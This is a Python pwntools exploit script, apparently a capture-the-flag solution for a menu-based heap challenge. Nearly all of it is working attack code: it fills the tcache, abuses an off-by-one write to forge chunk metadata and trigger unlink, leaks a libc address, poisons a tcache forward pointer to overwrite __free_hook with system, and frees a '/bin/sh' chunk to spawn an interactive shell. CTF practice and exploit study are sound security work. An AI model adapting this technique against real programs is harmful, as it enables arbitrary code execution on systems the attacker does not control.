from parse_args_and_some_func import *

sh:tube = all_parsed_args['io']

if all_parsed_args['debug_enable']:
    libc = all_parsed_args['cur_elf'].libc
else:
    libc = ELF('./libc.so')

context.update(arch="amd64", os='linux', endian="little")

def fight(idx, size, data="a"):
    sh.sendlineafter("choice:", "1")
    sh.sendlineafter("please choice your card:", str(idx))
    sh.sendlineafter("Infuse power:\n", str(size))
    sh.sendafter("quickly!", data)


def call(idx, data):
    sh.sendlineafter("choice:", "2")
    sh.sendlineafter("please choice your card\n", str(idx))
    sh.sendafter("start your bomb show\n", data)

def play(idx):
    sh.sendlineafter("choice:", "3")
    sh.sendlineafter("Which card:", str(idx))


def show(idx):
    sh.sendlineafter("choice:", "4")
    sh.sendlineafter("index:", str(idx))
    sh.recvuntil("dedededededede:")
    msg = sh.recvuntil("Dededededededede~~~~~~~~~~\n")
    log.info("msg recv:{}".format(msg))
    return msg

# malloc 7 chunks
for i in range(7):
    fight(i, 0x80)

# get sandwich-chunk
fight(7, 0x80)
fight(8, 0x18)
fight(9, 0x80)
fight(10, 0x10, "/bin/sh\x00") # gap top-chunk

# fulfill tcache bin[0x90]
for i in range(7):
    play(i)

play(7)
# off by one
call(8, b"a" * 0x10 + p64(0xb0) + b"\x90")
STOP()
# unlink
play(8)
play(9)
STOP()
# leak_addr
fight(0, 0xa0, "a" * 8)
msg = show(0)
leak_libc_addr = u64(msg[8:16])
LOG_ADDR("leak_libc_addr", leak_libc_addr)
libc_base_addr = leak_libc_addr - 0x3ebdd0
libc.address = libc_base_addr

# change fd-ptr
call(0, b"a" * 0x88 + p64(0x21) + p64(libc.sym['__free_hook']))
STOP()
# tcache bin attack
fight(1, 0x10)
fight(2, 0x10, p64(libc.sym['system']))

# get shell
play(10)

sh.interactive()


